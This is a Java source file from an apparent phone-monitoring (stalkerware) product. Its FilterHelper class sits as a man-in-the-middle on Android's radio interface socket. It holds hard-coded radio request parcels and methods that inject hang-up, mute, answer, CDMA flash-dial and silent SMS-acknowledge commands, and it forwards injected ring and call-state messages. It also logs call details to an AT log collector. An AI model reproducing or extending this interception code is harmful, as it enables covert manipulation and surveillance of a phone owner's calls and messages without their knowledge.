package com.vvt.callmanager.filter;

import java.util.ArrayList;

import android.os.Parcel;

import com.fx.socket.SocketHelper;
import com.vvt.callmanager.mitm.AtLogCollector;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.std.CallInfo;
import com.vvt.callmanager.std.RilConstant;
import com.vvt.callmanager.std.RilManager;
import com.vvt.callmanager.std.RilRequest;
import com.vvt.logger.FxLog;

/**
 * Since this class provides helper methods for all filters (including GSM and CDMA), 
 * any logics modification should be made with CAUTIONS!! 
 */
class FilterHelper {
	
	private static final String TAG = "FilterHelper";
	
	public static final int SERIAL_MUTE = 117901063; // 7,7,7,7
	public static final int SERIAL_CLCC = 134744072; // 8,8,8,8
	public static final int SERIAL_CALL = 151587081; // 9,9,9,9
	public static final int SERIAL_SMS  = 168430090; // 10,10,10,10
	
	// BEWARE!! Don't change serial number at will. It may affect the logics of state machines.
	public static final byte[] REQUEST_MUTE = { 0, 0, 0, 16, 53, 0, 0, 0, 7, 7, 7, 7, 1, 0, 0, 0, 0, 0, 0, 0 };
	
	public static final byte[] REQUEST_GET_CURRENT_CALL = { 0, 0, 0, 8, 9, 0, 0, 0, 8, 8, 8, 8 };
	public static final byte[] REQUEST_HANGUP = { 0, 0, 0, 16, 12, 0, 0, 0, 9, 9, 9, 9, 1, 0, 0, 0, 1, 0, 0, 0 };
	public static final byte[] REQUEST_HANGUP_BACKGROUND = {0, 0, 0, 8, 13, 0, 0, 0, 9, 9, 9, 9};
	public static final byte[] REQUEST_HANGUP_FOREGROUND = {0, 0, 0, 8, 14, 0, 0, 0, 9, 9, 9, 9};
	public static final byte[] REQUEST_HANGUP_LG = {0, 0, 0, 8, (byte) 204, 0, 0, 0, 9, 9, 9, 9};
	public static final byte[] REQUEST_SWITCH_CALLS = {0, 0, 0, 8, 15, 0, 0, 0, 9, 9, 9, 9};
	public static final byte[] REQUEST_CONFERENCE = {0, 0, 0, 8, 16, 0, 0, 0, 9, 9, 9, 9};
	public static final byte[] REQUEST_ANSWER = { 0, 0, 0, 8, 40, 0, 0, 0, 9, 9, 9, 9 };
	public static final byte[] REQUEST_CDMA_FLASH = {0, 0, 0, 16, 84, 0, 0, 0, 9, 9, 9, 9, 0, 0, 0, 0, 0, 0, 0, 0};
	
	public static final byte[] REQUEST_SMS_ACKNOWLEDGE = { 0, 0, 0, 20, 37, 0, 0, 0, 10, 10, 10, 10, 2, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0 };
	public static final byte[] REQUEST_CDMA_SMS_ACKNOWLEDGE = { 0, 0, 0, 16, 88, 0, 0, 0, 10, 10, 10, 10, 0, 0, 0, 0, 0, 0, 0, 0 };
	
	public static final byte[] UNSOL_CALL_STATE_CHANGED = {0, 0, 0, 8, 1, 0, 0, 0, (byte)233, 3, 0, 0};
	public static final byte[] SOL_SMS_ACKNOWLEDGE = {0, 0, 0, 12, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
	
	public static Parcel getParcel(byte[] data) {
		Parcel p = Parcel.obtain();
		p.unmarshall(data, 0, data.length);
		return p;
	}
	
	// Still not being used
	public static Parcel removeLastCall(Parcel p, CallInfo call) {
		Parcel mod = null;
		if (p != null && call != null) {
			mod = Parcel.obtain();
			mod.unmarshall(p.marshall(), 0, call.getPosition());
			
			mod.setDataPosition(16);
			int numCalls = mod.readInt();
			mod.setDataPosition(16);
			mod.writeInt(numCalls - 1);
			
			SocketHelper.updateParcelLength(mod);
		}
		return mod == null ? p : mod;
	}
	
	public static String getPhoneNumberFromCdmaCallWaiting(Parcel p) {
		String phoneNumber = null;
		int currentPos = p.dataPosition();
		p.setDataPosition(12);
		phoneNumber = p.readString();
		p.setDataPosition(currentPos);
		return phoneNumber;
	}
	
	public static String getPhoneNumberFromCdmaFlash(Parcel p) {
		String phoneNumber = null;
		int currentPos = p.dataPosition();
		p.setDataPosition(12);
		phoneNumber = p.readString();
		p.setDataPosition(currentPos);
		return phoneNumber;
	}
	
	public static void requestGetCurrentCalls(RilManager rilManager, InterceptingFilter filter) {
		// To avoid duplicated request
		for (RilRequest rr : rilManager.getRequestList()) {
			if (rr.request == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS
					&& rr.serial == FilterHelper.SERIAL_CLCC) {
				return;
			}
		}
		
		Parcel getCalls = FilterHelper.getParcel(
				FilterHelper.REQUEST_GET_CURRENT_CALL);
		rilManager.addRequest(getCalls);
		filter.writeToTerminate(getCalls);
	}
	
	/**
	 * @param callList of CallInfo
	 */
	public static void printCallInfo(
			ArrayList<CallInfo> callList, AtLogCollector atLogCollector) {
		
		String message = null;
		
		message = String.format("--- Current Calls (count=%d) ---", callList.size());
		if (Customization.SHOW_ATLOG_CALL) FxLog.v(TAG, message);
		if (Customization.COLLECT_ATLOG_CALL && atLogCollector != null) {
			atLogCollector.append(message);
		}
		
		for (CallInfo call : callList) {
			message = String.format(">>> %s", call.toString());
			if (Customization.SHOW_ATLOG_CALL) FxLog.v(TAG, message);
			if (Customization.COLLECT_ATLOG_CALL && atLogCollector != null) {
				atLogCollector.append(message);
			}
		}
	}
	
	public static void forwardRingMessages(InterceptingFilter filter, byte[] customRing) {
		if (customRing != null) {
			filter.writeToOriginate(FilterHelper.getParcel(customRing));
		}
		filter.writeToOriginate(FilterHelper.getParcel(FilterHelper.UNSOL_CALL_STATE_CHANGED));
	}
	
	public static void flash(InterceptingFilter filter, RilManager rilManager) {
		Parcel flash = getParcel(REQUEST_CDMA_FLASH);
		rilManager.addRequest(flash);
		filter.writeToTerminate(flash);
	}
	
	public static boolean isHangup(int response) {
		return response == RilConstant.RIL_REQUEST_HANGUP ||
			response == RilConstant.RIL_REQUEST_HANGUP_BACKGROUND ||
			response == RilConstant.RIL_REQUEST_HANGUP_FOREGROUND ||
			response == RilConstant.RIL_REQUEST_HANGUP_LG;
	}
	
	public static void hangupIndex(int index, 
			InterceptingFilter filter, RilManager rilManager) {
		Parcel hangup = FilterHelper.getHangupParcel(index);
		rilManager.addRequest(hangup);
		filter.writeToTerminate(hangup);
	}
	
	public static void hangupForeground(InterceptingFilter filter, RilManager rilManager) {
		Parcel hangup = FilterHelper.getParcel(REQUEST_HANGUP_FOREGROUND);
		rilManager.addRequest(hangup);
		filter.writeToTerminate(hangup);
	}
	
	public static void hangupBackground(InterceptingFilter filter, RilManager rilManager) {
		Parcel hangup = FilterHelper.getParcel(REQUEST_HANGUP_BACKGROUND);
		rilManager.addRequest(hangup);
		filter.writeToTerminate(hangup);
	}
	
	public static void flashDial(String phoneNumber, 
			InterceptingFilter filter, RilManager rilManager) {
		Parcel p = FilterHelper.getFlashDialParcel(phoneNumber);
		rilManager.addRequest(p);
		filter.writeToTerminate(p);
	}

	public static Parcel getHangupParcel(int gsmIndex) {
		Parcel p = getParcel(REQUEST_HANGUP);
		p.setDataPosition(16);
		p.writeInt(gsmIndex > 0 ? gsmIndex : 1);
		p.setDataPosition(0);
		return p;
	}
	
	public static Parcel getFlashDialParcel(String phoneNumber) {
		Parcel p = Parcel.obtain();
		p.writeInt(0);
		p.writeInt(RilConstant.RIL_REQUEST_CDMA_FLASH);
		p.writeInt(SERIAL_CALL);
		p.writeString(phoneNumber);
		SocketHelper.updateParcelLength(p);
		return p;
	}
	
	public static void setMute(boolean muteOn, InterceptingFilter filter, RilManager rilManager) {
		Parcel p = FilterHelper.getParcel(REQUEST_MUTE);
		p.setDataPosition(16);
		p.writeInt(muteOn ? 1 : 0);
		p.setDataPosition(0);
		rilManager.addRequest(p);
		filter.writeToTerminate(p);
	}

}
